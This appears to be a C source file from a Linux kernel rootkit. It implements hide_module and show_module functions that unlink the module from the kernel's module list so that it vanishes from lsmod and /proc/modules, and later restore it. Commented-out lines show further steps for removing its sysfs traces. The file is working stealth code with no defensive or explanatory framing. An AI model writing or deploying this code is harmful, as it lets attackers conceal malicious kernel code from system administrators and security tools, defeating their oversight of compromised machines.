#include "hide_module.h"
#include <linux/kernel.h>
#include <linux/module.h>

static short module_hidden = 0;
static struct list_head *saved_mod_list_head;
//struct kobject *saved_kobj_parent;

void show_module(void){
    if (module_hidden){
	    //int r;
	    list_add(&THIS_MODULE->list, saved_mod_list_head);
	    /*if ((r = kobject_add(&THIS_MODULE->mkobj.kobj, saved_kobj_parent, "yr")) < 0)
		    pr_info("Error to restore kobject to the list back!!\n");*/
        module_hidden = 0;
        pr_info("module has been unhidden...\n");
    }else{
        pr_info("module is not hidden yet!\n");
    }
}

void hide_module(void){
    if (!module_hidden){
	    saved_mod_list_head = THIS_MODULE->list.prev;
	    //saved_kobj_parent = THIS_MODULE->mkobj.kobj.parent;

	    list_del(&THIS_MODULE->list);
	    //kobject_del(&THIS_MODULE->mkobj.kobj);

	    //THIS_MODULE->sect_attrs = NULL;
	    //THIS_MODULE->notes_attrs = NULL;
        module_hidden = 1;
        pr_info("module has been hidden...\n");
    }else{
        pr_info("module is already hide!\n");
    }
}